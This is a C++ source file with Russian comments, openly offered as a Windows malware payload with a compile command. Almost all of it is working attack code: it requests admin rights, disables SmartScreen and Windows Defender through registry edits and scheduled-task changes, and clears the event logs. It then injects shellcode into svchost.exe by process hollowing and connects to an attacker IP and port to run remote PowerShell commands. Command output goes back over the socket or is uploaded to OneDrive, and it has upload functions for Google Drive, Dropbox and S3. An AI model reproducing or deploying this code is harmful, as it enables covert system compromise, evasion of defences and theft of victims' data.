// Этот payload выполняет несколько продвинутых действий. Сначала он проверяет, есть ли у него привилегии администратора, и если нет, запрашивает их. Затем он пытается обойти контроль учетных записей (UAC) и отключает защитные функции, такие как SmartScreen и Windows Defender, изменяя настройки реестра и отключая запланированные задачи. Payload очищает системные и журналы событий безопасности, чтобы скрыть свои следы. Он настраивает сетевое соединение с удаленным сервером для приема команд и отправки данных. Payload извлекает уникальный идентификатор машины, вычисляет его контрольную сумму CRC32 и отправляет эту информацию на сервер. Он может выполнять системные и PowerShell команды, полученные от сервера, с результатами, отправляемыми обратно по сети или загружаемыми на OneDrive, Google Drive, Dropbox или AWS через вебхук. Кроме того, он использует технику process hollowing для инъекции своего payload в легитимный процесс системы (svchost.exe), обеспечивая скрытый запуск в фоновом режиме. Наконец, payload скрывает свое консольное окно, чтобы избежать обнаружения пользователем. Эта комбинация техник делает payload способным избегать обнаружения, поддерживать постоянство, выполнять удаленное выполнение команд и эксфильтрацию данных на несколько облачных платформ.

// Автор: S3N4T0R

// Дата: 2024-7-17

//manual compile: i686-w64-mingw32-g++ -o кинжал.exe кинжал.cpp -lws2_32 -lole32 -luuid -static-libgcc -static-libstdc++

#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <shellapi.h>
#include <comdef.h>
#include <shlobj.h>
#include <shobjidl.h>
#include <winreg.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ole32.lib")

using namespace std;

// Прототипы функций
string выполнить_команду(const char* cmd);
void впрыскивание_в_процесс(LPCTSTR путьКЦели, LPVOID полезная_нагрузка, SIZE_T размер_полезной_нагрузки);

bool является_администратором() {
    BOOL is_admin = FALSE;
    PSID admin_group = NULL;
    SID_IDENTIFIER_AUTHORITY nt_authority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&nt_authority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &admin_group)) {
        CheckTokenMembership(NULL, admin_group, &is_admin);
        FreeSid(admin_group);
    }
    return is_admin;
}

void запросить_привилегии_администратора() {
    if (!является_администратором()) {
        SHELLEXECUTEINFO sei = { sizeof(sei) };
        sei.lpVerb = "runas";
        sei.lpFile = GetCommandLineA();
        sei.nShow = SW_HIDE;  // Скрыть окно

        if (!ShellExecuteEx(&sei)) {
            exit(1);
        }
    }
}

void обход_UAC() {
    HRESULT hr;
    IFileOperation *pfo = NULL;

    // Инициализация COM.
    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (SUCCEEDED(hr)) {
        // Создание объекта IFileOperation.
        hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pfo));
        if (SUCCEEDED(hr)) {
            // Установка флагов операции в режим "elevated".
            pfo->SetOperationFlags(FOF_NO_UI);

            // ...выполнение операций...

            // Освобождение объекта IFileOperation.
            pfo->Release();
        }
        CoUninitialize();
    }
}

void отключить_умный_фильтр_SmartScreen() {
    string cmd = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"DisableSmartScreenFilter\" /t REG_DWORD /d \"0\" /f";
    system(cmd.c_str());
}

void отключить_Windows_Defender() {
    const char* cmd =
        "@echo off\n"
        "rem Отключение защиты в реальном времени\n"
        "reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f\n"
        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f\n"
        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f\n"
        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f\n"
        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f\n"
        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f\n"
        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f\n"
        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f\n"
        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f\n"
        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f\n"
        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f\n"
        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f\n"
        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"2\" /f\n"
        "rem Отключение логирования\n"
        "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f\n"
        "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f\n"
        "rem Отключение задач WD\n"
        "schtasks /Change /TN \"Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh\" /Disable\n"
        "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /Disable\n"
        "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /Disable\n"
        "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /Disable\n"
        "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /Disable\n"
        "echo Защита в реальном времени Windows Defender отключена.\n"
        "pause\n";
    system(cmd);
}

void очистить_журналы_событий() {
    string cmd = "cmd.exe /c wevtutil.exe cl System";
    system(cmd.c_str());
    cmd = "cmd.exe /c wevtutil.exe cl Security";
    system(cmd.c_str());
}

string выполнить_команду_PowerShell(const char* cmd) {
    string powershellCmd = "powershell.exe -Command \"";
    powershellCmd += cmd;
    powershellCmd += "\"";
    
    return выполнить_команду(powershellCmd.c_str());
}

string выполнить_команду(const char* cmd) {
    char buffer[128];
    string result = "";
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) throw runtime_error("_popen() failed!");
    try {
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        _pclose(pipe);
        throw;
    }
    _pclose(pipe);
    return result;
}

string получить_GUID_машины() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[256];
        DWORD bufferSize = sizeof(buffer);
        if (RegQueryValueEx(hKey, "MachineGuid", NULL, NULL, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
            return string(buffer);
        }
        RegCloseKey(hKey);
    }
    return "";
}

DWORD вычислить_CRC32(const string& data) {
    DWORD crc = 0xFFFFFFFF;
    for (char c : data) {
        crc ^= c;
        for (int i = 0; i < 8; i++) {
            crc = (crc >> 1) ^ (0xEDB88320 & (-(crc & 1)));
        }
    }
    return ~crc;
}

void загрузить_на_OneDrive(const string& data, const string& access_token) {
    string url = "https://graph.microsoft.com/v1.0/me/drive/root:/payload_output.txt:/content";
    string cmd = "curl -X PUT -H \"Authorization: Bearer " + access_token + "\" -d \"" + data + "\" " + url;
    выполнить_команду_PowerShell(cmd.c_str());
}

void загрузить_на_GoogleDrive(const string& data, const string& access_token) {
    string url = "https://www.googleapis.com/upload/drive/v3/files?uploadType=media";
    string cmd = "curl -X POST -H \"Authorization: Bearer " + access_token + "\" -H \"Content-Type: text/plain\" -d \"" + data + "\" " + url;
    выполнить_команду_PowerShell(cmd.c_str());
}

void загрузить_на_Dropbox(const string& data, const string& access_token) {
    string url = "https://content.dropboxapi.com/2/files/upload";
    string cmd = "curl -X POST -H \"Authorization: Bearer " + access_token + "\" -H \"Dropbox-API-Arg: {\\\"path\\\": \\\"/payload_output.txt\\\"}\" -H \"Content-Type: application/octet-stream\" -d \"" + data + "\" " + url;
    выполнить_команду_PowerShell(cmd.c_str());
}

void загрузить_на_AWS_S3(const string& data, const string& bucket_name, const string& access_key, const string& secret_key) {
    string url = "https://" + bucket_name + ".s3.amazonaws.com/payload_output.txt";
    string cmd = "curl -X PUT -T \"-\" -H \"Host: " + bucket_name + ".s3.amazonaws.com\" -H \"x-amz-date: `date -u +'%Y%m%dT%H%M%SZ'`\" -H \"Authorization: AWS4-HMAC-SHA256 Credential=" + access_key + "/`date -u +'%Y%m%d'`/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-date, Signature=`echo -n \"AWS4\"$secret_key | openssl sha256 -hmac AWS4 | sed 's/^(stdin)= //g'`\" " + url + " --data \"" + data + "\"";
    выполнить_команду_PowerShell(cmd.c_str());
}

void главный_цикл(const string& domain, const string& ip, int port, const string& access_token /*= ""*/) {
    SOCKET s;
    sockaddr_in server;

    WSADATA wsData;
    if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) {
        cout << "Ошибка при инициализации WSA" << endl;
        return;
    }

    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        cout << "Не удалось создать сокет" << endl;
        WSACleanup();
        return;
    }

    server.sin_addr.s_addr = inet_addr(ip.c_str());
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    if (connect(s, (sockaddr*)&server, sizeof(server)) < 0) {
        cout << "Ошибка соединения" << endl;
        closesocket(s);
        WSACleanup();
        return;
    }

    string machine_guid = получить_GUID_машины();
    if (!machine_guid.empty()) {
        DWORD crc32_checksum = вычислить_CRC32(machine_guid);
        string payload = "CRC32Checksum: " + to_string(crc32_checksum) + "\n";
        send(s, payload.c_str(), payload.size(), 0);
    }

    char buffer[1024] = {0};
    while (true) {
        string command;
        recv(s, buffer, sizeof(buffer), 0);
        command = string(buffer);

        if (command == "exit\n") break;

        string output = выполнить_команду_PowerShell(command.c_str());

        if (!access_token.empty()) {
            загрузить_на_OneDrive(output, access_token);
        } else {
            send(s, output.c_str(), output.size(), 0);
        }
    }

    closesocket(s);
    WSACleanup();
}

void впрыскивание_в_процесс(LPCTSTR путьКЦели, LPVOID полезная_нагрузка, SIZE_T размер_полезной_нагрузки) {
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CONTEXT ctx;
    DWORD oldProtect;

    if (!CreateProcess(путьКЦели, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        cout << "Не удалось создать целевой процесс" << endl;
        return;
    }

    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        cout << "Не удалось получить контекст потока" << endl;
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    LPVOID targetBase = VirtualAllocEx(pi.hProcess, NULL, размер_полезной_нагрузки, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!targetBase) {
        cout << "Не удалось выделить память в целевом процессе" << endl;
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    if (!WriteProcessMemory(pi.hProcess, targetBase, полезная_нагрузка, размер_полезной_нагрузки, NULL)) {
        cout << "Не удалось записать полезную нагрузку в целевой процесс" << endl;
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    if (!VirtualProtectEx(pi.hProcess, targetBase, размер_полезной_нагрузки, PAGE_EXECUTE_READ, &oldProtect)) {
        cout << "Не удалось изменить защиту памяти в целевом процессе" << endl;
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    ctx.Eax = (DWORD)targetBase;
    if (!SetThreadContext(pi.hThread, &ctx)) {
        cout << "Не удалось установить контекст потока" << endl;
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        cout << "Не удалось возобновить поток целевого процесса" << endl;
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

void скрыть_консоль() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
}

int main() {
    скрыть_консоль();

    запросить_привилегии_администратора();
    обход_UAC();
    отключить_умный_фильтр_SmartScreen();
    отключить_Windows_Defender();
    очистить_журналы_событий();

    string domain = "www.microsoft.com"; // Измените по необходимости
    string ip = "192.168.1.10";  // Измените на IP атакующего
    int port = 4444;            // Измените на порт атакующего
    string onedrive_token = "your_token";   // Установите токен доступа OneDrive
    string googledrive_token = "your_token";// Установите токен доступа Google Drive
    string dropbox_token = "your_token";    // Установите токен доступа Dropbox
    string CloudFront_token = "your_token"; // Установите URL вебхука AWS

    // Выберите, какой токен использовать, здесь используется onedrive_token в качестве примера
    string access_token = onedrive_token;

    // Пример полезной нагрузки для впрыскивания в процесс
unsigned char payload[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
    0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
    0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x66, 0x81, 0x78,
    0x18, 0x0B, 0x02, 0x41, 0x51, 0x6A, 0x01, 0x48, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85,
    0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01,
    0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9,
    0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C,
    0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01,
    0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04,
    0x88, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83,
    0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x49, 0xFF,
    0xFF, 0xFF, 0x5D, 0x49, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x95, 0x00, 0x01, 0x00,
    0x00, 0x4C, 0x8D, 0x85, 0x80, 0x00, 0x00, 0x00, 0x48, 0x31, 0xC9, 0x41, 0xBA, 0x4C, 0x77, 0x26,
    0x07, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5,
    0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13,
    0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65,
    0x78, 0x65, 0x00, 0x63, 0x6D, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00
}; 
    // Замените на фактическую полезную нагрузку
    SIZE_T payloadSize = sizeof(payload);

    // Выполнение впрыскивания в процесс
    впрыскивание_в_процесс("C:\\Windows\\System32\\svchost.exe", payload, payloadSize);

    главный_цикл(domain, ip, port, access_token);

    return 0;
}
